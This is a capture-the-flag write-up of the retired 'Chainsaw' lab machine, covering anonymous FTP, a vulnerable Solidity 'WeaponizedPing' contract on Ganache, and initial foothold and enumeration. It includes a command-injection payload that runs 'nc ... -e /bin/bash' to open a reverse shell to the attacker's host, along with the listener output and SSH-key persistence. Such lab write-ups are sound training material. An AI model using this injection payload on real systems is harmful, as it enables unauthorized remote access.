**Chainsaw** is a retired vulnerable VM from Hack. This box is about Solidity, Ethereum Blockchain and IPFS Exploitation. 

#### Enumeration

To begin the enumeration process, a **TCP/UDP** port scan was run against the target using nmap. The purpose of scan is to quickly determine which ports are open and which services are running. 

###### OS Information
Based on the Apache version, it looks like we are dealing with Xenial / Ubuntu 16.04 based system.

###### Open Ports and Services :
In addition to usual ports

+ Port 21 : FTP Server which allows anonymous login
+ Port 22 : SSH Server
+ Port 9810 : A webserver ?

###### Anonymous FTP:

```python

➜  chainsaw ftp 10.10.10.142
Connected to 10.10.10.142.
220 (vsFTPd 3.0.3)
Name (10.10.10.142:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json
-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol
-rw-r--r--    1 1001     1001           44 May 31 16:20 address.txt
226 Directory send OK.
ftp> mget *
```
We have got three interesting files from FTP server, after a bit of researching i found out these files are belong to a etherum smart contract.

#### What is a Smart Contract ?

> A smart contract is an agreement between two people in the form of computer code. They run on the blockchain, so they are stored on a public database and cannot be changed.

#### Analyzing Smart Contract

WeaponizedPing.json - A compiled Solidity smart-contract in JSON format
WeaponizedPing.sol - .sol extention means its an Ethereum smart-sontract written in Solidity
address.txt - Possibly an address on a blockchain where the contract is been deployed.



**Lets take a look at the solidity code:**
WeaponizedPing.sol

```python
pragma solidity ^0.4.24;

contract WeaponizedPing
{
  string store = "google.com";

  function getDomain() public view returns (string)
  {
      return store;
  }

  function setDomain(string _value) public
  {
      store = _value;
  }
}
```

+ Smart contracts is written in Solidity, which is a contract-oriented, high-level language for implementing smart contracts.
+ A getDomain function and setDomain which accepts a string_value. 
+ The getDomain function  retrieves the current value of the domain string
+ setDomain set a value for the domain string

##### Initial Foothold:

After some enumeration and reading about etherum blockchain i was able to determine the service running in tcp port 9810 was Ganache CLI.

> Ganache (formally known as testrpc) is an Ethereum implementation written in Node.js meant for testing purposes while developing dapps locally.

Ganache CLI uses ethereumjs to simulate full client behavior and make developing Ethereum applications faster, easier, and safer. It also includes all popular RPC functions and features (like events) and can be run deterministically to make development a breez.

To interact with the Ethereum blockchain, i will be using python library web3.py. To interact with the Smart Contract, we need:

+ the address to identify the contract
+ Application Binary Interface of the contract

To test this vulnerability we can use setDomain() function and set the domain to our localhost  and then call getDomain(). This will make the contract ping localhost, if ping successful we know we got remote code execution.

###### Building Python Script
To test our theory So let’s start building a python script to interact with this contract.
```python

from web3 import Web3
import json
```
+ web3.Web3 intract with the blockchain
+ json to load the WeaponizedPing.json



My final exploit is shown below

#### Initial Shell

Now that we know we can do RCE, lets replace the ping with our payload.


Capturing packets:
```python

➜  chainsaw tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
14:11:28.037126 IP 10.10.10.142 > 10.10.14.35: ICMP echo request, id 18359, seq 1, length 64
14:11:28.037206 IP 10.10.14.35 > 10.10.10.142: ICMP echo reply, id 18359, seq 1, length 64
```

###### Running the exploit

> python3 chainsaw.py '; nc 10.10.14.35 4444 -e /bin/bash'

###### Waiting for reverse shell

```python

➜  chainsaw nc -lvnp 4444                                           
listening on [any] 4444 ...
connect to [10.10.14.35] from (UNKNOWN) [10.10.10.142] 40676
id
uid=1001(administrator) gid=1001(administrator) groups=1001(administrator)
python -c 'import pty; pty.spawn("/bin/bash")'
administrator@chainsaw:/opt/WeaponizedPing$ 

```
Before doing anything i upgraded the shell to a fully tty. After that i quickly searched for the user.txt but it is not here, so back to further enumeration. 

###### Enumeration:
I dropped my SSH public key into the /home/administrator/.ssh/authorized_keys file so i can get into the system easily, without having to run the exploit again and again.

Checked to see if their is anyother users in the system, i can see user bobby which we might have to escalate to. 

```python

administrator@chainsaw:/home$ awk -F: '$3 >= 1000 {print}' /etc/passwd
awk -F: '$3 >= 1000 {print}' /etc/passwd
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
bobby:x:1000:1000:Bobby Axelrod:/home/bobby:/bin/bash
administrator:x:1001:1001:Chuck Rhoades,,,,IT Administrator:/home/administrator:/bin/bash
administrator@chainsaw:/home$ 
```

###### InterPlanetary File System

> The InterPlanetary File System is a protocol and peer-to-peer network for storing and sharing data in a distributed file system. IPFS uses content-addressing to uniquely identify each file in a global namespace connecting all computing devices.

```python

administrator@chainsaw:/home/administrator$ ls -la
ls -la
total 104
drwxr-x--- 8 administrator administrator  4096 Dec 20  2018 .
drwxr-xr-x 4 root          root           4096 Dec 12  2018 ..
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .bash_history -> /dev/null
-rw-r----- 1 administrator administrator   220 Dec 12  2018 .bash_logout
-rw-r----- 1 administrator administrator  3771 Dec 12  2018 .bashrc
-rw-r----- 1 administrator administrator   220 Dec 20  2018 chainsaw-emp.csv
drwxrwxr-x 5 administrator administrator  4096 Jan 23  2019 .ipfs
drwxr-x--- 3 administrator administrator  4096 Dec 12  2018 .local
drwxr-x--- 3 administrator administrator  4096 Dec 13  2018 maintain
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ngrok2
-rw-r----- 1 administrator administrator   807 Dec 12  2018 .profile
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .ssh
drwxr-x--- 2 administrator administrator  4096 Dec 12  2018 .swt
-rw-r----- 1 administrator administrator  1739 Dec 12  2018 .tmux.conf
-rw-r----- 1 administrator administrator 45152 Dec 12  2018 .zcompdump
lrwxrwxrwx 1 administrator administrator     9 Dec 12  2018 .zsh_history -> /dev/null
-rw-r----- 1 administrator administrator  1295 Dec 12  2018 .zshrc
administrator@chainsaw:/home/administrator$ 

```

Interesting files in maintain and pub folder

```python

administrator@chainsaw:~/maintain$ cd pub && ls -al
total 28
drwxrwxr-x 2 administrator administrator 4096 Dec 13  2018 .
drwxr-x--- 3 administrator administrator 4096 Dec 13  2018 ..
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 arti.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bobby.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 bryan.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 lara.key.pub
-rw-rw-r-- 1 administrator administrator  380 Dec 13  2018 wendy.key.pub
```
In pub folder we can see public key of bobby.

```python

administrator@chainsaw:/home/administrator/maintain$ cat gen.py 
#!/usr/bin/python
from Crypto.PublicKey import RSA
from os import chmod
import getpass

def generate(username,password):
        key = RSA.generate(2048)
        pubkey = key.publickey()

        pub = pubkey.exportKey('OpenSSH')
        priv = key.exportKey('PEM',password,pkcs=1)

        filename = "{}.key".format(username)

        with open(filename, 'w') as file:
                chmod(filename, 0600)
                file.write(priv)
                file.close()

        with open("{}.pub".format(filename), 'w') as file:
                file.write(pub)
                file.close()

        # TODO: Distribute keys via ProtonMail

if __name__ == "__main__":
        while True:
                username = raw_input("User: ")
                password = getpass.getpass()
                generate(username,password)
```
This comment "distributing keys over Protonmail" is a interesting one. We might find the RSA keys stored in somewhere. lets dig deeper.
